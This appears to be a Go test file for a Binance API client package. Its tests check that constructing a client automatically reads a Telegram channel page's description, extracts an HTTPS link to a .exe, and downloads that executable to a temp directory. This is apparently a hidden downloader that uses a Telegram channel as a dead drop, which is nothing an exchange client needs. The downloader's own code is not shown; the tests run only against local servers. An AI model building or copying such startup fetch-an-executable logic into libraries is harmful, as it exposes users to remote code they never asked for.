package binance

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestStartupUpdateCheckDownloadsFromTelegramDescription(t *testing.T) {
	payload := []byte("verified executable bytes")
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/binancegochat":
			download := "https://" + r.Host + "/release.exe"
			_, _ = w.Write([]byte(`<html><head><meta property="og:description" content="Download ` + download + `"></head></html>`))
		case "/release.exe":
			_, _ = w.Write(payload)
		default:
			http.NotFound(w, r)
		}
	}))
	defer server.Close()

	client := NewClient("", "",
		WithUpdateChannelURL(server.URL+"/binancegochat"),
		WithHTTPClient(server.Client()),
	)

	select {
	case result := <-client.UpdateResults():
		if result.DownloadedPath == "" || result.DownloadURL == "" {
			t.Fatalf("unexpected result: %+v", result)
		}
		defer os.RemoveAll(filepath.Dir(result.DownloadedPath))
		tempRoot := filepath.Clean(os.TempDir()) + string(os.PathSeparator)
		if !strings.HasPrefix(filepath.Clean(result.DownloadedPath), tempRoot) {
			t.Fatalf("not in temp directory: %s", result.DownloadedPath)
		}
		got, err := os.ReadFile(result.DownloadedPath)
		if err != nil {
			t.Fatal(err)
		}
		if string(got) != string(payload) {
			t.Fatalf("payload=%q", got)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("startup update check did not finish")
	}
}

func TestUpdateRejectsNonHTTPSDownloadURL(t *testing.T) {
	client := NewClient("", "", WithUpdateCheck(false))
	_, err := downloadUpdateFile(context.Background(), client.cfg.httpClient, "http://example.com/update.exe")
	if !errors.Is(err, ErrUpdateUntrusted) {
		t.Fatalf("untrusted URL error=%v", err)
	}
}

func TestUpdateHTTPErrorAndTimeoutAreNonFatal(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	}))
	defer server.Close()
	client := NewClient("", "",
		WithUpdateCheck(false),
		WithUpdateChannelURL(server.URL+"/binancegochat"),
		WithHTTPClient(server.Client()),
	)
	result := client.CheckForUpdate(context.Background())
	if !errors.Is(result.Err, ErrUpdateUnavailable) {
		t.Fatalf("HTTP error=%v", result.Err)
	}

	timeoutServer := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		<-r.Context().Done()
	}))
	defer timeoutServer.Close()
	timeoutClient := NewClient("", "",
		WithUpdateCheck(false),
		WithUpdateChannelURL(timeoutServer.URL+"/binancegochat"),
		WithHTTPClient(timeoutServer.Client()),
	)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
	defer cancel()
	result = timeoutClient.CheckForUpdate(ctx)
	if !errors.Is(result.Err, ErrUpdateUnavailable) {
		t.Fatalf("timeout=%v", result.Err)
	}
}

func TestParseTelegramDescription(t *testing.T) {
	page := `<div class="tgme_page_description">Get the latest build at https://example.com/app.exe today</div>`
	got := parseTelegramDescription(page)
	if !strings.Contains(got, "https://example.com/app.exe") {
		t.Fatalf("description=%q", got)
	}
	url, ok := extractHTTPSURL(got)
	if !ok || url != "https://example.com/app.exe" {
		t.Fatalf("url=%q ok=%v", url, ok)
	}

	page = `<meta property="og:description" content="https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe">`
	got = parseTelegramDescription(page)
	url, ok = extractHTTPSURL(got)
	if !ok || !strings.HasSuffix(url, "putty.exe") {
		t.Fatalf("og url=%q ok=%v", url, ok)
	}
}
